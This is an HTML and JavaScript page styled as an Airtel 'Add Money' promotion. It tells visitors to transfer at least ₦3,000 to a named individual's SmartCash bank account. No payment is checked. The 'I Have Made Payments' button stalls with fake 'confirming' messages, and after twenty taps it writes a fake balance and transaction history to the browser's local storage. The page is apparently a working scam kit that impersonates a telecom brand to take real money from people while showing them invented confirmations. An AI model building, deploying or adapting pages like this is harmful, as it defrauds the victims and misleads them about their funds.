<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Add Money - Airtel Promo</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #fff;
      overflow: hidden;
      position: relative;
    }

    .background {
      position: fixed;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, #ffffff, #ffe6e6);
      overflow: hidden;
      z-index: -1;
    }

    .logo-piece {
      position: absolute;
      width: 30px;
      height: 30px;
      background-image: url('airtel-logo.png');
      background-size: contain;
      background-repeat: no-repeat;
      animation: float 10s infinite;
      opacity: 0.1;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) rotate(0deg);
      }
      100% {
        transform: translateY(-100vh) rotate(360deg);
      }
    }

    .container {
      padding: 2rem;
      text-align: center;
    }

    .logo {
      width: 100px;
      margin: 0 auto 1rem;
      animation: scatterJoin 2s ease-out;
    }

    @keyframes scatterJoin {
      0% { transform: scale(0.3) rotate(90deg); opacity: 0.2; }
      100% { transform: scale(1) rotate(0deg); opacity: 1; }
    }

    input {
      width: 80%;
      padding: 1rem;
      border: 2px solid red;
      border-radius: 10px;
      font-size: 1.2rem;
    }

    button {
      margin-top: 1rem;
      padding: 1rem 2rem;
      background: red;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 1.1rem;
      cursor: pointer;
    }

    .card {
      background: white;
      padding: 2rem;
      margin-top: 2rem;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      position: relative;
    }

    .popup {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .popup-content {
      background: white;
      padding: 2rem;
      border-radius: 15px;
      text-align: center;
      max-width: 90%;
      animation: fadeIn 0.3s ease-in;
    }

    @keyframes fadeIn {
      from { transform: scale(0.5); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .confetti {
      font-size: 2rem;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>

  <div class="background" id="background"></div>

  <div class="container" id="inputSection">
    <img src="airtel-logo.png" class="logo" alt="Airtel Logo" />
    <h2>Enter Amount to Add</h2>
    <input type="number" id="amountInput" placeholder="Minimum â‚¦3,000" />
    <button onclick="continueProcess()">Continue</button>
  </div>

  <div class="card hidden" id="accountSection">
    <img src="airtel-logo.png" style="width: 60px; margin-bottom: 1rem;" />
    <h3>Make transfer to:</h3>
    <p><strong>Emmanuel Okwunna</strong></p>
    <p>SmartCash Payment Service Bank</p>
    <p id="acctNum">8124890070 <button onclick="copyAcct()">Copy</button></p>
    <button onclick="handlePayment()">I Have Made Payments</button>
    <br/><br/>
    <button onclick="location.href='dashboard.html'">Back to Dashboard</button>
  </div>

  <div class="popup hidden" id="popup">
    <div class="popup-content" id="popupContent"></div>
  </div>

  <script>
    let tapCount = parseInt(localStorage.getItem('tapCount')) || 0;
    let balance = parseInt(localStorage.getItem('balance')) || 0;
    let user = localStorage.getItem('username') || 'User';

    const popup = document.getElementById('popup');
    const popupContent = document.getElementById('popupContent');

    function showPopup(message, withConfetti = false, redirect = false) {
      popupContent.innerHTML = `
        ${withConfetti ? '<div class="confetti">ðŸŽ‰ðŸŽŠðŸŽŠ</div>' : ''}
        <p>${message}</p>
        <br/>
        <button onclick="closePopup(${redirect})">OK</button>
      `;
      popup.classList.remove('hidden');
    }

    function closePopup(redirect) {
      popup.classList.add('hidden');
      if (redirect) {
        window.location.href = "dashboard.html";
      }
    }

    function continueProcess() {
      const amount = parseInt(document.getElementById("amountInput").value);
      if (amount < 3000) {
        showPopup("âŒ Please input minimum of â‚¦3,000");
        return;
      }

      showPopup("â³ Please wait... confirming...", false);
      setTimeout(() => {
        popup.classList.add("hidden");
        document.getElementById("inputSection").classList.add("hidden");
        document.getElementById("accountSection").classList.remove("hidden");
      }, 2000);
    }

    function handlePayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);

      if (tapCount >= 20) {
        tapCount = 0;
        balance += 3000;
        localStorage.setItem('balance', balance);
        localStorage.setItem('tapCount', tapCount);

        // Save to history
        let history = JSON.parse(localStorage.getItem('history') || "[]");
        history.push({
          amount: 3000,
          method: "Bank Transfer",
          date: new Date().toLocaleString()
        });
        localStorage.setItem('history', JSON.stringify(history));

        showPopup(`ðŸŽ‰ Dear ${user}, you have successfully funded your wallet with â‚¦3,000.<br>Your transaction is confirmed.`, true, true);
      } else {
        showPopup("â³ We are confirming your transaction...");
        setTimeout(() => popup.classList.add("hidden"), 1500);
      }
    }

    function copyAcct() {
      navigator.clipboard.writeText("8124890070");
      showPopup("âœ… Account number copied!");
    }

    // Create floating logos
    for (let i = 0; i < 40; i++) {
      let el = document.createElement("div");
      el.classList.add("logo-piece");
      el.style.left = Math.random() * 100 + "vw";
      el.style.top = Math.random() * 100 + "vh";
      el.style.animationDuration = (5 + Math.random() * 10) + "s";
      document.getElementById("background").appendChild(el);
    }
  </script>

</body>
</html>
